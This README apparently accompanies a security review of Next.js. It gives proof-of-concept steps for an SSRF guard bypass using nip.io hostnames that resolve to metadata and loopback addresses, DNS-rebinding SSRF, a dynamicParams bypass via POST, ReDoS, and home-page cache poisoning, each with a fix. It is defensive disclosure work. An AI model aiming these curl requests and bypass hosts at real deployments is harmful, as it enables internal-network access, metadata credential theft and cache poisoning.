# Security PoCs — Next.js `canary` review

Reproductions for the highest-severity findings in `../SECURITY_REVIEW_canary_2026-09.md`.
All PoCs are **defensive** and target only `localhost` / documented cloud-metadata addresses. No third party is targeted.

Two kinds:
- **Runnable now** — execute the *actual shipped code* in isolation (no Next.js build needed). Deterministic.
- **Repro recipe** — server-level findings that need a running app; exact files + commands are given (this checkout has no `node_modules`/build, so they aren't executed here).

---

## Runnable now (execute shipped code)

### `og-ssrf-e2e.mjs` — H7 (END-TO-END: real server-side fetch fired) / `og-ssrf-guard-bypass.mjs` — H7, `next/og` SSRF guard bypass (High)
Runs the SHIPPED `next/og` SSRF guard (`Ms`/`Xu`, extracted verbatim from `packages/next/src/compiled/@vercel/og/index.node.js` into `_og_guard_extracted.mjs`).

```bash
node og-ssrf-guard-bypass.mjs
```
Shows the guard **blocks** literal `169.254.169.254`/`127.0.0.1` but **allows** `169.254.169.254.nip.io` / `127.0.0.1.nip.io` / `localtest.me` (any hostname that DNS-resolves to a private IP) — because it only checks literal IPv4/IPv6 and never resolves DNS. The fetch also uses `redirect:"follow"` with no re-check, so an allowed public host that `302`s to a private IP is reached too.
**Fix:** resolve the hostname and reject if any resolved IP is private (as `image-optimizer.ts` `fetchExternalImage` does), + `redirect:"manual"` + timeout + size cap.

### `bot-ua-redos.mjs` — M-i, bot `User-Agent` ReDoS (Medium)
Loads the ACTUAL regex from `packages/next/src/shared/lib/router/utils/html-bots.ts` and times it on a non-matching `User-Agent`.

```bash
node bot-ua-redos.mjs
```
Shows clean quadratic growth (16 KB → ~275 ms per eval; 2-3 evals/request incl. Edge SSR). Root cause: unanchored greedy `[\w-]+-Google`.
**Fix:** anchor/bound the prefix (mirror the already-linear `Google-[\w-]+`) or cap UA length before `.test()`.

---

## Repro recipes (need a running app)

Prereqs: a Next.js build of this checkout (`pnpm install && pnpm build-all`) and a scratch app, then `node packages/next/dist/bin/next build/start`.

### H3 — `dynamicParams = false` admission bypass via form POST (High)
`app/products/[slug]/page.tsx`:
```tsx
export const dynamicParams = false
export function generateStaticParams() { return [{ slug: 'known' }] }
export default async function Page({ params }) {
  const { slug } = await params
  return <div>SECRET PAGE FOR: {slug}</div>   // gated content
}
```
Build + start, then:
```bash
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:3000/products/draft-123
#   -> 404  (closed route, as intended)
curl -s -o /dev/null -w '%{http_code}\n' -X POST \
     -H 'content-type: application/x-www-form-urlencoded' \
     http://localhost:3000/products/draft-123
#   -> 200 + "SECRET PAGE FOR: draft-123"   (bypass)
```
Add `-H 'RSC: 1'` to the POST to get the Flight payload for the non-allowlisted param (data exfil). Any form-content-type POST also nulls `ssgCacheKey` → full uncached render on *any* SSG/ISR page (cache-bypass DoS).
**Fix:** if `handleAction` returns `null`, apply the closed-route 404 before rendering.

### H1 — `/_next/image` DNS-rebinding SSRF (High)
`next.config.js`: `images: { remotePatterns: [{ protocol: 'https', hostname: '**' }] }` (a documented UGC config).
Requires a DNS name you control whose record flips between a public IP (first lookup, passes the `isPrivateIp` check) and `169.254.169.254`/`127.0.0.1` (the `fetch` connect). Then:
```bash
curl "http://localhost:3000/_next/image?url=https://<rebinding-host>/&w=640&q=75"
```
The guard vets one DNS resolution; undici re-resolves at connect time (TOCTOU) → the fetch hits the private IP. The upstream HTTP status is reflected (port/existence oracle); image-returning internal endpoints are fully read.
**Fix:** pin the vetted IP through the connection (custom `undici` dispatcher `lookup`), re-vet each redirect hop.

### H2 — `/index` → `/` home-page cache poisoning (High)
`app/page.tsx` with `export const revalidate = 5` (ISR home) + `app/[slug]/page.tsx` that renders something distinctive (or `notFound()`) for unknown slugs. Build + `next start`, then when `/` is stale:
```bash
curl http://localhost:3000/index      # routes to /[slug] (slug='index'), writes to the '/' cache key
curl http://localhost:3000/           # now serves the [slug]-for-'index' render (poisoned)
```
`route-module.ts:1073` collapses `resolvedPathname === '/index'` → `'/'` even for an interpolated dynamic route, so both map to the home cache entry.
**Fix:** only collapse `/index`→`/` for the literal home route (`normalizedSrcPage === '/'`), or include route identity in the cache key.

---

*These reproduce findings in a code review; validate against the current upstream before reporting. Localhost-only.*

### `og-ssrf-chain.mjs` — H7, full end-to-end SSRF chain (executed)
Two real HTTP servers: a **public** Next-style OG endpoint (`GET /api/og?img=<url>` → `ImageResponse`, using the shipped bundle) and an **internal-only** loopback service. An unauthenticated request to the public endpoint with an attacker-chosen `img` host (`127.0.0.1.nip.io`, guard-allowed) makes the server reach the internal service and return its content.
```bash
node og-ssrf-chain.mjs
```
Proves three things at once: **SSRF reach** (public→internal), the **guard is active but bypassed** (a literal-IP control returns 500 "SSRF protection" and does not reach internal), and **content exfiltration** (A/B: a RED vs BLUE internal secret yields different attacker-received PNGs → the internal resource's bytes flow back to the caller). Loopback-only; point the host at `169.254.169.254.nip.io` and it targets real cloud metadata (not done here).
